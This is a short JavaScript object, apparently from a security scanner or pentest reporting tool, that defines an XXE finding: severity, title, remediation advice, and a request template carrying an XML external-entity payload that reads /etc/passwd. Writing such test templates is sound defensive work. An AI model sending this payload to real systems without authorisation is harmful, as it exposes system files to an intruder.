const report = {
  xxe: {
    severity: "high",
    marker: MK,
    request: (i) => `POST ${i.base_url}${i.endpoint} body=<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`,
    title: (i) => `XXE on ${i.endpoint} allows arbitrary file read`,
    expected: "The response contains /etc/passwd content (or the OOB callback fires for the external entity).",
    fix: "Disable DTD/external entity resolution and use a hardened XML parser."
  },
};
